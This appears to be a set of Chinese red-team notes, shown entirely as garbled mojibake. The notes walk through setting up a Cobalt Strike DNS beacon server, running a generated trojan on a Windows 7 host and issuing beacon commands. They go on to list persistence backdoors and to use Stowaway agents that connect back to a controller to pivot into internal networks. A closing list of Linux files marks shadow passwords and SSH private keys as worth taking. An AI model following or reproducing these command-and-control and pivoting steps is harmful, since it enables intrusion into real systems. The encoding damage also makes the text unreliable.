1.äº‘ä¸»æœºTeamserveré…ç½®ç«¯å£53å’Œ50050å¯ç”¨ 2.ä¹°ä¸€ä¸ªåŸŸåä¿®æ”¹è§£æè®°å½•å¦‚ä¸‹ï¼š è®°å½•ç±»å‹-ä¸»æœºè®°å½•-è®°å½•å€¼ Aè®°å½•-csä¸»æœºå-CSæœåŠ¡å™¨IP NSè®°å½•-ns1ä¸»æœºå-ä¸Šä¸ªAè®°å½•åœ°å€ NSè®°å½•-ns2ä¸»æœºå-ä¸Šä¸ªAè®°å½•åœ°å€ 3.é…ç½®DNSç›‘å¬å™¨å†…å®¹å¦‚ä¸‹ï¼š a1.wulaobao.top a2.wulaobao.top www.wulaobao.com ## é…ç½®æ–¹æ³•ï¼š â€œListenersâ€â€œAddâ€ï¼Œâ€œPayloadâ€é€‰â€œBeacon DNSâ€ï¼Œâ€œDNS Hostsâ€å¡«å…¥â€œa1.wulaobao.topâ€å’Œâ€œa2.wulaobao.topâ€ï¼Œâ€œDNS Host(Stager)â€å¡«â€œwww.wulaobao.comâ€ 4.ç”Ÿæˆåé—¨æ‰§è¡Œä¸Šçº¿åå¯ç”¨å‘½ä»¤ï¼š ## ç”¨åˆšé…ç½®çš„DNSç›‘å¬å™¨ç”Ÿæˆåé—¨ ## ä½¿ç”¨DNSè¿æ¥æ—¶ï¼Œä¸»æœºåˆšä¸Šçº¿å¯èƒ½æ˜¾ç¤ºä¸ºâ€œ[unkown]â€ï¼Œè¿™æ˜¯å› ä¸ºè¯¥æ–¹æ³•è¿æ¥é€Ÿåº¦æ…¢ ## è¿æ¥åéœ€è¦æ‰§è¡Œå‡ æ¡å‘½ä»¤å®ç°æ§åˆ¶ å‘½ä»¤ï¼š checkin mode dns-txt ## æœ‰å¦‚åŒâ€œhost called home, sent: 8 bytesâ€çš„æ•°æ®ä¼ è¾“ï¼Œè¯´æ˜æˆåŠŸ æ‰§è¡Œä¸ªå‘½ä»¤éªŒè¯ä¸€ä¸‹ shell whoami å‘½ä»¤ä¸å›æ˜¾ï¼š beacon checkin [] Tasked beacon to checkin beacon mode dns-txt [+] data channel set to DNS-TXT [+] host called home, sent: 8 bytes beacon shell whoami [] Tasked beacon to run: whoami [+] host called home, sent: 53 bytes åŸŸåè§£æé…ç½® æ·»åŠ åŸŸåè§£æè®°å½• æ·»åŠ å®‰å…¨ç»„ï¼Œå¼€æ”¾53ç«¯å£ CSæœåŠ¡ç«¯è®¾ç½® å°†CSå’Œjdkä¸Šä¼ åˆ°äº‘ä¸»æœºçš„ opt ç›®å½•ä¸‹ï¼Œæˆ‘çš„äº‘ä¸»æœºç”¨çš„centos7ç³»ç»Ÿ ç„¶åå®‰è£…jdkï¼Œç»™csèµ‹å€¼æ‰§è¡Œæƒé™ï¼Œç„¶åè¿è¡ŒcsæœåŠ¡ç«¯ï¼Œå¦‚ä¸‹ rpm -ivh jdk-8u102-linux-x64.rpm yum install unzip -y unzip cobaltstrike4.zip cd cobaltstrike4 chmod +x * .teamserver 172.21.154.225 jaden äº‘ä¸»æœºçš„CSæœåŠ¡ç«¯å¯åŠ¨ï¼Œæ•ˆæœå¦‚ä¸‹ï¼Œå¯åŠ¨å¯†ç ä¸º jaden å¯åŠ¨teamserverçš„æ—¶å€™ï¼ŒæŒ‡å®šçš„ipåœ°å€ä½¿ç”¨æˆ‘ä»¬è´­ä¹°çš„äº‘ä¸»æœºä¸Šæ—¶æç¤ºçš„å†…ç½‘ipåœ°å€ï¼Œå¦‚ä¸‹ CSå®¢æˆ·ç«¯è¿æ¥ å¯åŠ¨ä¹‹åå¦‚ä¸‹ï¼Œåˆ›å»ºç›‘å¬å™¨ csç”Ÿæˆç›‘å¬å™¨çš„æ—¶å€™å¯ä»¥é€‰æ‹©å„ç§åè®®ï¼Œè¿˜å¯ä»¥ç»™csæ·»åŠ æ’ä»¶æ¥å¤šæ·»åŠ å‡ ä¸ªåè®®è¿›æ¥ï¼Œæ¯”å¦‚ï¼Œå¾ˆå¤šå®‰å…¨è®¾å¤‡å¯¹httpåè®®çš„æ•°æ®éƒ½æœ‰ç›‘æ§ï¼Œå¦‚æœæˆ‘ä»¬çš„æµé‡æ•°æ®æ˜¯é€šè¿‡httpåè®®ä¼ è¾“çš„ï¼Œé‚£ä¹ˆå¾ˆå®¹æ˜“è¢«ç›‘æ§åˆ°ï¼Œæ‰€ä»¥è¦æ¢ä¸€ä¸ªåè®®ï¼Œæ¯”å¦‚ä½¿ç”¨DNSåè®®ï¼Œå¦‚ä¸‹ ç”Ÿæˆåé—¨ é€‰æ‹©ç›‘å¬å™¨ ä¸Šçº¿ä¸»æœº æ¯”å¦‚ï¼Œç”¨win7ä¸»æœºè¯•è¯•ï¼Œå°†æœ¨é©¬ä¸Šä¼ åˆ°win7ä¸Šæ‰§è¡Œ æƒé™ç»´æŒ linuxï¼šrootkitï¼Œè¿›ç¨‹æ³¨å…¥ï¼Œsshåé—¨ã€pamåé—¨ã€vimåé—¨ã€åè®®åé—¨ã€suidåé—¨ã€straceåé—¨ã€inetdæœåŠ¡åé—¨ windowsï¼š æœåŠ¡ã€æ³¨å†Œè¡¨ã€å¯åŠ¨é¡¹ã€è®¡åˆ’ä»»åŠ¡ã€webåé—¨ã€é»„é‡‘ç™½é“¶ç¥¨æ® https://blog.csdn.net/FisrtBqy/article/details/124418779 https://www.freebuf.com/articles/web/180581.html https://zhuanlan.zhihu.com/p/401733128 https://www.cnblogs.com/xiaozi/category/1582391.html 10-10-4 stowawayStowaway ## ç›®å‰æœ‰å¾ˆå¤šä¼˜ç§€çš„å†…ç½‘ä»£ç†å·¥å…·å¦‚frp, npsç­‰ï¼Œä½†æ˜¯æœ‰äº›æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬éœ€è¦æ­å»ºå¤šçº§ç½‘ç»œä»£ç†ï¼Œç›´è¾¾ç›®æ ‡å†…ç½‘æ·±å¤„ã€‚è€Œç›®å‰frpï¼Œnpsç­‰å·¥å…·åœ¨æ­å»ºå¤šçº§ä»£ç†æ—¶æ“ä½œè¿‡å»å¤æ‚ä¸ä¾¿äºç®¡ç†ã€‚ ## è€ŒStowawayå·¥å…·å°±æ˜¯éœ€è¦è§£å†³è¿™ä¸€é—®é¢˜ã€‚Stowawayæ˜¯ä¸€ä¸ªåˆ©ç”¨goè¯­è¨€ç¼–å†™ã€ä¸“ä¸ºæ¸—é€æµ‹è¯•å·¥ä½œè€…åˆ¶ä½œçš„å¤šçº§ä»£ç†å·¥å…·ï¼Œç”¨æˆ·å¯ä½¿ç”¨æ­¤ç¨‹åºå°†å¤–éƒ¨æµé‡é€šè¿‡å¤šä¸ªèŠ‚ç‚¹ä»£ç†è‡³å†…ç½‘ï¼Œçªç ´å†…ç½‘è®¿é—®é™åˆ¶ï¼Œæ„é€ æ ‘çŠ¶èŠ‚ç‚¹ç½‘ç»œï¼Œå¹¶è½»æ¾å®ç°ç®¡ç†åŠŸèƒ½ã€‚ é¡¹ç›®åœ°å€ï¼šhttps://github.com/ph4ntonn/Stowaway ## towawayä¸€å…±åŒ…å«ä¸¤ç§è§’è‰²ï¼Œåˆ†åˆ«æ˜¯ï¼š admin ä»£è¡¨æ§åˆ¶ç«¯ agent ä»£è¡¨è¢«æ§ç«¯ ## åè¯å®šä¹‰ èŠ‚ç‚¹: æŒ‡admin || agent ä¸»åŠ¨æ¨¡å¼: ## æŒ‡å½“å‰æ“ä½œçš„èŠ‚ç‚¹ä¸»åŠ¨è¿æ¥å¦ä¸€ä¸ªèŠ‚ç‚¹ è¢«åŠ¨æ¨¡å¼: ## æŒ‡å½“å‰æ“ä½œçš„èŠ‚ç‚¹ç›‘å¬æŸä¸ªç«¯å£ï¼Œç­‰å¾…å¦ä¸€ä¸ªèŠ‚ç‚¹è¿æ¥ ä¸Šæ¸¸: ## æŒ‡å½“å‰æ“ä½œçš„èŠ‚ç‚¹ä¸å…¶çˆ¶èŠ‚ç‚¹ä¹‹é—´çš„æµé‡ ä¸‹æ¸¸ï¼š## æŒ‡å½“å‰æ“ä½œçš„èŠ‚ç‚¹ä¸å…¶æ‰€æœ‰å­èŠ‚ç‚¹ä¹‹é—´çš„æµé‡ ç¯å¢ƒæ­å»º ä»£ç†æ­å»º admin -l ## è¢«åŠ¨æ¨¡å¼ä¸‹çš„ç›‘å¬åœ°å€[ip]: -s ## èŠ‚ç‚¹é€šä¿¡åŠ å¯†å¯†é’¥,æ‰€æœ‰èŠ‚ç‚¹(adminagent)å¿…é¡»ä¸€è‡´ -c ## ä¸»åŠ¨æ¨¡å¼ä¸‹çš„ç›®æ ‡èŠ‚ç‚¹åœ°å€ â€“proxy ## socks5ä»£ç†æœåŠ¡å™¨åœ°å€ â€“proxyu ## socks5ä»£ç†æœåŠ¡å™¨ç”¨æˆ·å(å¯é€‰) â€“proxyp ##socks5ä»£ç†æœåŠ¡å™¨å¯†ç (å¯é€‰) â€“down ## ä¸‹æ¸¸åè®®ç±»å‹,é»˜è®¤ä¸ºè£¸TCPæµé‡,å¯é€‰HTTP agent -l ## è¢«åŠ¨æ¨¡å¼ä¸‹çš„ç›‘å¬åœ°å€[ip]: -s ## èŠ‚ç‚¹é€šä¿¡åŠ å¯†å¯†é’¥ -c ## ä¸»åŠ¨æ¨¡å¼ä¸‹çš„ç›®æ ‡èŠ‚ç‚¹åœ°å€ â€“proxy ## socks5ä»£ç†æœåŠ¡å™¨åœ°å€ â€“proxyu ## socks5ä»£ç†æœåŠ¡å™¨ç”¨æˆ·å(å¯é€‰) â€“proxyp ## socks5ä»£ç†æœåŠ¡å™¨å¯†ç (å¯é€‰) â€“reconnect ## é‡è¿æ—¶é—´é—´éš”ï¼ˆsï¼‰ â€“rehost ## ç«¯å£å¤ç”¨æ—¶å¤ç”¨çš„IPåœ°å€ â€“report ## ç«¯å£å¤ç”¨æ—¶å¤ç”¨çš„ç«¯å£å· â€“up ## ä¸Šæ¸¸åè®®ç±»å‹,é»˜è®¤ä¸ºè£¸TCPæµé‡,å¯é€‰HTTP â€“down ## ä¸‹æ¸¸åè®®ç±»å‹,é»˜è®¤ä¸ºè£¸TCPæµé‡,å¯é€‰HTTP â€“cs ## è¿è¡Œå¹³å°çš„shellç¼–ç ç±»å‹ï¼Œé»˜è®¤ä¸ºutf-8ï¼Œå¯é€‰gbk ä¸€çº§ä»£ç† 1. æ§åˆ¶ç«¯é…ç½® ä¸Šä¼ æ§åˆ¶ç«¯åˆ°kaliï¼Œä½¿ç”¨è¢«åŠ¨æ¨¡å¼ï¼Œç›‘å¬ç«¯å£8000ï¼Œå¹¶å¯¹é€šä¿¡è¿›è¡ŒåŠ å¯†ç§˜é’¥ä¸º123ã€‚ç­‰å¾…è¢«æ§ç«¯çš„è¿æ¥ .linux_x64_admin -l 192.168.125.134:8000 -s 123 #æˆ–è€…ä¸æŒ‡å®šipé»˜è®¤ç›‘å¬0.0.0.0 .linux_x64_admin -l 8000 -s 123 2. è¢«æ§ç«¯é…ç½® åœ¨win2012-1ä¸Šæ‰§è¡Œï¼Œä½¿ç”¨ç§˜é’¥123è¿æ¥æ§åˆ¶ç«¯8000ç«¯å£ï¼Œå¹¶è®¾ç½®é‡è¿é—´éš”æ—¶é—´ï¼Œå½“æ§åˆ¶ç«¯æ‰çº¿æ—¶å®¢æˆ·ç«¯æ¯éš”8sé‡è¿æ§åˆ¶ç«¯ windows_x64_agent.exe -c 192.168.125.134:8000 -s 123 â€“reconnect 8 æ­¤æ—¶å®¢æˆ·ç«¯ä¸æ§åˆ¶ç«¯é—´æ­å»ºäº†ä¸€æ¡sockséš§é“ã€‚ adminæ§åˆ¶ç«¯å‘½ä»¤ åœ¨adminæ§åˆ¶å°ä¸­ï¼Œç”¨æˆ·å¯ä»¥ç”¨tabæ¥è¡¥å…¨å‘½ä»¤ï¼Œæ–¹å‘é”®ä¸Šä¸‹å·¦å³æ¥æŸ¥æ‰¾å†å²ç§»åŠ¨å…‰æ ‡ã€‚adminæ§åˆ¶å°åˆ†ä¸ºä¸¤ä¸ªå±‚çº§ï¼Œç¬¬ä¸€å±‚ä¸ºmain panelï¼Œç¬¬äºŒå±‚ä¸ºnode panel main panel è¾“å…¥helpæŸ¥çœ‹è¯¦ç»†ä½¿ç”¨å‚æ•° detail\t## å±•ç¤ºåœ¨çº¿èŠ‚ç‚¹çš„è¯¦ç»†ä¿¡æ¯ topo ## å±•ç¤ºåœ¨çº¿èŠ‚ç‚¹çš„çˆ¶å­å…³ç³» use ## ä½¿ç”¨æŸä¸ªagent exit ## é€€å‡º node panel å½“å®¢æˆ·ç«¯è¿æ¥æ§åˆ¶ç«¯åï¼Œä½¿ç”¨detailå°±å¯ä»¥æŸ¥çœ‹åˆ°ç›®å‰æœ‰å“ªäº›å®¢æˆ·ç«¯å·²ç»è¿æ¥ï¼Œä½¿ç”¨use èŠ‚ç‚¹ï¼Œç„¶åä¼šè¿›å…¥è¿™ä¸ªèŠ‚ç‚¹çš„æ§åˆ¶é¢æ¿ 1ï¼Œæ¥ç€æˆ‘ä»¬è®¾ç½®socks5ä»£ç†ç«¯å£ä¸º7777ï¼Œè¿æ¥è´¦å·å¯†ç ä¸º admin adminï¼Œä¾›æµ‹è¯•äººå‘˜è¿›è¡Œè¿æ¥è®¿é—®ä»£ç† socks 7777 admin admin 2ï¼Œä½¿ç”¨proxifierè¿æ¥æ§åˆ¶ç«¯ æ­¤æ—¶æˆåŠŸè®¿é—®ç¬¬ä¸€å±‚ç½‘ç»œ10.x äºŒçº§ä»£ç† åœ¨ä¸Šè¿°ä»£ç†ä¿æŒä¸å˜çš„æƒ…å†µä¸‹ï¼Œå¦‚ä¸‹æ“ä½œ 1. åœ¨win2012-1ä¸Šå¼€å¯ä¸€ä¸ªç›‘å¬ï¼Œç›‘å¬10000ç«¯å£ 2ï¼Œwin7ä¸»åŠ¨è¿æ¥win2012-1çš„10000ç«¯å£ windows_x64_agent.exe -c 192.168.10.9:10000 -s 123 â€“reconnect 8 ## æ­¤æ—¶æ§åˆ¶ç«¯ä¼šç«‹å³æ˜¾ç¤ºæ–°åŠ å…¥çš„èŠ‚ç‚¹ æ­¤æ—¶proxifierå†æ·»åŠ ä»£ç†æœåŠ¡å™¨å’Œä»£ç†è§„åˆ™å³å¯è®¿é—®ç¬¬äºŒå±‚ç½‘è·¯20.x ä¸€ï¼ŒLinux1-1 é‡è¦æ–‡ä»¶ç›®å½•1-1-1 ç³»ç»Ÿè¿è¡Œçº§åˆ«etcinittab 1-1-2 å¼€æœºå¯åŠ¨é…ç½®æ–‡ä»¶etcrc.local etcrc.drc[0~6].d ## å½“æˆ‘ä»¬éœ€è¦å¼€æœºå¯åŠ¨è‡ªå·±çš„è„šæœ¬æ—¶ï¼Œåªéœ€è¦å°†å¯æ‰§è¡Œè„šæœ¬ä¸¢åœ¨ etcinit.d ç›®å½•ä¸‹ï¼Œç„¶ååœ¨ etcrc.drc.d ä¸­å»ºç«‹è½¯é“¾æ¥å³å¯ ln -s etcinit.dsshd etcrc.drc3.dS100ssh ## æ­¤å¤„sshdæ˜¯å…·ä½“æœåŠ¡çš„è„šæœ¬æ–‡ä»¶ï¼ŒS100sshæ˜¯å…¶è½¯é“¾æ¥ï¼ŒSå¼€å¤´ä»£è¡¨åŠ è½½æ—¶è‡ªå¯åŠ¨ï¼›å¦‚æœæ˜¯Kå¼€å¤´çš„è„šæœ¬æ–‡ä»¶ï¼Œä»£è¡¨è¿è¡Œçº§åˆ«åŠ è½½æ—¶éœ€è¦å…³é—­çš„ã€‚ 1-2-3 ç³»ç»Ÿæ—¥å¿—##æ—¥å¿—é»˜è®¤å­˜æ”¾ä½ç½®ï¼š varlog ## æŸ¥çœ‹æ—¥å¿—é…ç½®æƒ…å†µï¼š more etcrsyslog.conf 1-2-4 éªŒè¯å’Œæˆæƒæ–¹é¢çš„ä¿¡æ¯varlogsecure 1-2-5 ç½‘å¡é…ç½®æ–‡ä»¶etcsysconfignetwork-scripts VMè™šæ‹Ÿæœºï¼šifcfg-ens33 VMè™šæ‹Ÿæœºï¼šifcfg-ens192 äº‘ä¸»æœºï¼šifcfg-eth0 ç‰©ç†æœºï¼šem1 em2 em3 em4 TYPEâ€Ethernetâ€ ç½‘å¡ç±»å‹ï¼ˆä»¥å¤ªç½‘ï¼‰ PROXY_METHODâ€noneâ€ æ— ä»£ç† BROWSER_ONLYâ€noâ€ BOOTPROTOâ€staticâ€ å³boot protocolï¼ˆå¯åŠ¨åè®®ï¼‰,ç½‘å¡è·å–IPåœ°å€çš„æ–¹å¼ï¼ŒDHCPåŠ¨æ€ï¼ŒSTATICé™æ€ DEFROUTEâ€yesâ€ IPV4_FAILURE_FATALâ€noâ€ IPV6INITâ€yesâ€ IPV6_AUTOCONFâ€yesâ€ IPV6_DEFROUTEâ€yesâ€ IPV6_FAILURE_FATALâ€noâ€ IPV6_ADDR_GEN_MODEâ€stable-privacyâ€ NAMEâ€ens33â€ ç½‘å¡åç§° DEVICEâ€ens33â€ ONBOOTâ€yesâ€ å¼€å§‹æ˜¯å¦å¯åŠ¨ç½‘å¡ IPADDR IPåè®®ä¸­æä¾›çš„é€»è¾‘åœ°å€ï¼Œå³IPåœ°å€ xxx.xxx.xxx.xxxï¼Œå¯é€šè¿‡ip aæŸ¥è¯¢åˆ†é…çš„ipåœ°å€ NETMASK å­ç½‘æ©ç ï¼Œä¸€èˆ¬ä¸º255.255.255.0 å¿«é€Ÿå¯»å€ åˆ’åˆ†å­ç½‘ GATEWAY ç½‘å…³ï¼Œæ§åˆ¶æ•°æ®ä»ä¸€ä¸ªç½‘æ®µè¿›å…¥å¦ä¸€ä¸ªç½‘æ®µï¼Œç›¸å½“äºå®¶ä¸­çš„è·¯ç”±å™¨ï¼Œåœ¨è™šæ‹Ÿæœºçš„è™šæ‹Ÿç½‘ç»œç¼–è¾‘å™¨ä¸­æ‰¾ DNS1 åŸŸåè§£æåè®®ï¼Œå°†åŸŸåä¸ipåœ°å€ä¸€ä¸€å¯¹åº”ï¼Œä¸€èˆ¬å†™æˆç½‘å…³ DNS2 å¯ä»¥é…ç½®æˆ114.114.114.114ç­‰ 1-2-6 æ›´æ”¹ä¸»æœºåetchostname æ–‡ä»¶ hostname set-hostname xxxx æ›´æ”¹ä¸»æœºå 1-2-7 æœ¬åœ°DNSåŸŸåè§£æetchosts æ–‡ä»¶ 1-2-8 è®¾ç½®DNSetcresolv.conf 1-2-9 å…¨å±€é…ç½®æ–‡ä»¶ï¼Œä»£ç†ï¼Œè·¯å¾„etcprofile 1-2-10 ç”¨æˆ·çº§åˆ«æ“ä½œ.bash_profile æ–‡ä»¶ 1-2-11 æŸ¥çœ‹shelletcshells æ–‡ä»¶ 1-2-12 Bashå…¨å±€é…ç½®æ–‡ä»¶ï¼Œå…¨å±€æ“ä½œetcbashrc æ–‡ä»¶ 1-2-13 ç”¨æˆ·çº§åˆ«.bashrc æ–‡ä»¶ 1-2-14 å†…æ ¸ç‰ˆæœ¬etcredhat-release æ–‡ä»¶ 1-2-15 è¿è¡Œçº§åˆ«etcinittab æ–‡ä»¶ 1-2-16 rootç”¨æˆ·æƒé™etcsudoers æ–‡ä»¶ 1-2-17 yumè½¯ä»¶ä»“åº“æºetcyum.repos.d æ–‡ä»¶ 1-2-18 æ–‡ä»¶å®‰è£…è§£å‹ç¼©â€¦usrlocal ç›®å½• 1-2-19 å†…æ ¸é…ç½®æ–‡ä»¶ï¼ˆå†…æ ¸è½¬å‘ å†…æ ¸ç«¯å£èŒƒå›´ï¼‰etcsysctl.conf æ–‡ä»¶ 1-2-20 æ—¥å¿—æ–‡ä»¶usrlog ç›®å½• æ—¥å¿—æ–‡ä»¶ messages\t## ç³»ç»Ÿçº§æ—¥å¿—æ–‡ä»¶ secure ## å®‰å…¨æ—¥å¿—æ–‡ä»¶ dmesg ## ç¡¬ä»¶ä¿¡æ¯åŠ è½½æƒ…å†µæ—¥å¿—æ–‡ä»¶ cron ## å®šæ—¶ä»»åŠ¡æ—¥å¿—æ–‡ä»¶ wtmp ## ç™»å½•è€…ä¿¡æ¯æ–‡ä»¶ lastlog ## ç”¨æˆ·è¿‘æœŸç™»å½•æƒ…å†µ 1-2-21 å®šæ—¶ä»»åŠ¡etccrontab ç›®å½• cron.daily cron.hourly cron.monthly cron,weekly cron.d 1-2- å…¶ä»–etcsysconfignetwork-scriptsifcfg-eth0 ç½‘ç»œæ¥å£é…ç½®æ–‡ä»¶ etcudevrules.d70-persistent-net.rules ç½‘ç»œçš„é€»è¾‘åç§° etcgroup ç»„é…ç½®æ–‡ä»¶ etcpasswd ç”¨æˆ·é…ç½®æ–‡ä»¶ binbash ç”¨æˆ·shellæ‰€åœ¨ç›®å½• etcprofile ç³»ç»Ÿçº§ç”¨æˆ·ç¯å¢ƒå˜é‡profile etcbashrc ç³»ç»Ÿçº§çš„hashrcæ–‡ä»¶ etcfstab ç£ç›˜æŒ‚è½½ç‚¹æ‰€åœ¨çš„æ–‡ä»¶ etcyum.repos.d yumåº“æºæ–‡ä»¶æ‰€åœ¨ç›®å½• etcinitrcS.conf ç³»ç»Ÿå¯åŠ¨é€‰é¡¹ etcsecuritylimits.conf ç”¨æˆ·é™åˆ¶æ‰€åœ¨ç›®å½• etcselinuxconfig SeLinuxé…ç½®æ–‡ä»¶ etcinittab initçš„é…ç½®æ–‡ä»¶ï¼Œè®¾ç½®ç³»ç»Ÿå¯åŠ¨ç•Œé¢ï¼ˆå‘½ä»¤è¡Œã€å›¾å½¢ç•Œé¢ï¼‰ etcsysconfignetwork (æœºå­åç§°é…ç½®æ–‡ä»¶ï¼‰ etcsysconfignetwork-scriptsifcfg-eth0 ï¼ˆç½‘ç»œæ¥å£é…ç½®æ–‡ä»¶ï¼Œç”¨äºIPåœ°å€çš„è®¾ç½®ï¼‰ etcresolv.conf ( DNSæœåŠ¡å™¨é…ç½®æ–‡ä»¶ï¼Œæœ€å¤š3æ¡DNSé…ç½®ä¿¡æ¯ ) etchosts ( æœ¬åœ°ä¸»æœºåç§°è§£é‡Šæ–‡ä»¶ ) etcsysconfigi18n ( ç³»ç»Ÿå­—ä½“é…ç½®æ–‡ä»¶ ) etcexports ( nfsæœåŠ¡å™¨çš„é…é¢æ–‡ä»¶) etcsyslog.conf ( syslogdæœåŠ¡çš„é…ç½®æ–‡ä»¶) etccrontab ( ç³»ç»Ÿä»»åŠ¡é…ç½®æ–‡ä»¶ ) etcspoolcronroot ( rootçš„cronä»»åŠ¡æ–‡ä»¶ ) etcrc.local ( ç³»ç»Ÿå¯åŠ¨å®Œæˆåˆå§‹åŒ–è„šæœ¬çš„æ‰§è¡Œåï¼Œæ‰§è¡Œè¯¥è„šæœ¬ï¼Œå°†å…±äº«æ–‡ä»¶æŒ‚è½½é…ç½®åœ¨è¯¥è„šæœ¬ä¸­ ) etcrc.drc.sysinit ( ç³»ç»Ÿå¯åŠ¨æ—¶è¢«è°ƒç”¨æ‰§è¡Œçš„ç³»ç»Ÿåˆå§‹åŒ–è„šæœ¬ ) etcinittab ( ç³»ç»Ÿè¿è¡Œä¸­ç¬¬ä¸€ä¸ªè¿›ç¨‹INITçš„é…ç½®æ–‡ä»¶ï¼ŒINITè¿›ç¨‹è¿è¡Œåå°†æŒ‰ç…§è¯¥æ–‡ä»¶ä¸­çš„é…ç½®å†…å®¹å¯åŠ¨ç³»ç»Ÿä¸­éœ€è¦è¿è¡Œçš„ç¨‹åº ) etcinit.d ( ç³»ç»ŸæœåŠ¡å¯åŠ¨ç¨‹åºè„šæœ¬ ) etcprofile.d ( ç³»ç»Ÿåˆ«åè‡ªå®šä¹‰æ–‡ä»¶å¤¹ ) root.bash_history ( rootçš„å‘½ä»¤å†å²æ–‡ä»¶ï¼Œå…¶ç”¨æˆ·ä¿å­˜åœ¨â€œhomeç”¨æˆ·â€æ–‡ä»¶å¤¹ä¸‹) etcbashprofile å’Œ etcbashrc (ç¯å¢ƒå˜é‡é…ç½®æ–‡ä»¶) homeç”¨æˆ·.bash_profile å’Œ homeç”¨æˆ·.bashrc (ç”¨æˆ·çš„ç¯å¢ƒå˜é‡é…ç½®æ–‡ä»¶) etcskel (åˆå§‹çš„ç”¨æˆ·é…ç½®æ¨¡æ¿ï¼Œå½“ç”¨æˆ·å¯¹è‡ªå·±çš„é…ç½®æ–‡ä»¶åšäº†é”™è¯¯çš„è®¾ç½®åï¼Œå¯æ‹·è´è¯¥ç›®å½•ä¸­æ¨¡æ¿æ–‡ä»¶å¤åˆ¶åˆ°ç”¨æˆ·ç›®å½•è¿›è¡Œåˆå§‹åŒ–çš„æ¢å¤) etcShells (å½“å‰ç³»ç»Ÿä¸­èƒ½ä½¿ç”¨çš„shellç¨‹åºåˆ—è¡¨) etcpasswd (ç”¨æˆ·å¸å·æ–‡ä»¶ï¼Œä¿å­˜æ‰€æœ‰çš„ç”¨æˆ·è´¦å·) etcshadow ï¼ˆä¿å­˜å¯†æ–‡çš„ç”¨æˆ·å£ä»¤ï¼Œä»…rootç”¨æˆ·èƒ½å¤ŸæŸ¥çœ‹ï¼‰ root.sshauthorized_keys root.sshid_rsa root.sshid_ras.keystore root.sshknown_hosts è®°å½•æ¯ä¸ªè®¿é—®è®¡ç®—æœºç”¨æˆ·çš„å…¬é’¥ etcpasswd etcshadow etcmy.cnf mysqlé…ç½®æ–‡ä»¶ etchttpdconfhttpd.conf apacheé…ç½®æ–‡ä»¶ root.bash_history ç”¨æˆ·å†å²å‘½ä»¤è®°å½•æ–‡ä»¶ root.mysql_history mysqlå†å²å‘½ä»¤è®°å½•æ–‡ä»¶ procmounts è®°å½•ç³»ç»ŸæŒ‚è½½è®¾å¤‡ porcconfig.gz å†…æ ¸é…ç½®æ–‡ä»¶ varlibmlocatemlocate.db å…¨æ–‡ä»¶è·¯å¾„ porcselfcmdline å½“å‰è¿›ç¨‹çš„cmdlineå‚æ•° 1-2 å¸¸ç”¨æŒ‡ä»¤1-2-1 telnetæŸ¥çœ‹è¿œç¨‹ä¸»æœºæŸä¸ªç«¯å£å·æ˜¯å¦å¼€å¯ telnet 101.132.222.28 3306 ## æŸ¥çœ‹æŸä¸ªç«¯å£æ˜¯å¦å¼€æ”¾ â€”â€”â€”â€”â€”â€” éœ€è¦å®‰è£… yum install telnet 1-2-2 netstat## netstatå‘½ä»¤æ˜¯Linuxä¸‹çš„ä¸€ä¸ªç½‘ç»œç»Ÿè®¡å·¥å…·ï¼Œç”¨äºæ˜¾ç¤ºç½‘ç»œè¿æ¥ã€è·¯ç”±è¡¨ã€æ¥å£ç»Ÿè®¡ç­‰ä¿¡æ¯ã€‚ä»¥ä¸‹æ˜¯ä¸€äº›å¸¸ç”¨çš„netstatå‘½ä»¤å‚æ•°ï¼š - -aï¼š## æ˜¾ç¤ºæ‰€æœ‰è¿æ¥å’Œç›‘å¬ç«¯å£ã€‚ - -nï¼š## ä»¥æ•°å­—å½¢å¼æ˜¾ç¤ºåœ°å€å’Œç«¯å£å·ï¼Œä¸è¿›è¡ŒåŸŸåè§£æã€‚ - -pï¼š## æ˜¾ç¤ºè¿›ç¨‹æ ‡è¯†ç¬¦å’Œç¨‹åºåç§°ï¼Œæ­¤é€‰é¡¹éœ€è¦rootæƒé™ã€‚ - -tï¼š## ä»…æ˜¾ç¤ºTCPè¿æ¥ã€‚ - -uï¼š## ä»…æ˜¾ç¤ºUDPè¿æ¥ã€‚ - -lï¼š## ä»…æ˜¾ç¤ºç›‘å¬çŠ¶æ€çš„å¥—æ¥å­—ã€‚ - -rï¼š## æ˜¾ç¤ºè·¯ç”±è¡¨ä¿¡æ¯ã€‚ - -iï¼š## æ˜¾ç¤ºç½‘ç»œæ¥å£ä¿¡æ¯ã€‚ - -sï¼š## æ˜¾ç¤ºç½‘ç»œç»Ÿè®¡ä¿¡æ¯ï¼ŒåŒ…æ‹¬åè®®ã€æ¥å£ã€å‘é€å’Œæ¥æ”¶çš„æ•°æ®åŒ…æ•°é‡ç­‰ã€‚ - -cï¼š## æ¯éš”æŒ‡å®šç§’æ•°åˆ·æ–°ä¸€æ¬¡ç½‘ç»œçŠ¶æ€ä¿¡æ¯ã€‚ ä¾‹å¦‚ï¼Œè¦æŸ¥çœ‹æ‰€æœ‰TCPè¿æ¥ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š netstat -lnt 1-2-3 nslookup dig## æŸ¥è¯¢dnsåŸŸåè®°å½• nslookup baidu.com ## â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€” éœ€è¦å®‰è£… yum install bind-utils -y ## Linuxä¸­çš„digå‘½ä»¤æ˜¯ä¸€ä¸ªDNSæŸ¥è¯¢å·¥å…·ï¼Œç”¨äºæŸ¥è¯¢DNSè®°å½•ã€‚å®ƒæ”¯æŒå¤šç§ç±»å‹çš„DNSæŸ¥è¯¢ï¼ŒåŒ…æ‹¬Aã€AAAAã€MXã€NSç­‰è®°å½•ç±»å‹ã€‚ - +shortï¼š## ä½¿ç”¨ç¼©å†™å½¢å¼æ˜¾ç¤ºç»“æœã€‚ - +noallï¼š## ä¸æ˜¾ç¤ºæ‰€æœ‰è®°å½•ã€‚ - +answerï¼š## åªæ˜¾ç¤ºåº”ç­”éƒ¨åˆ†ã€‚ - +statsï¼š## æ˜¾ç¤ºç»Ÿè®¡ä¿¡æ¯ã€‚ - +timeXï¼š## è®¾ç½®è¶…æ—¶æ—¶é—´ä¸ºXç§’ã€‚ - +retryï¼š##å°è¯•é‡æ–°æŸ¥è¯¢DNSæœåŠ¡å™¨ç›´åˆ°æˆåŠŸæˆ–è¾¾åˆ°æœ€å¤§é‡è¯•æ¬¡æ•°ã€‚ - +filterXï¼š## 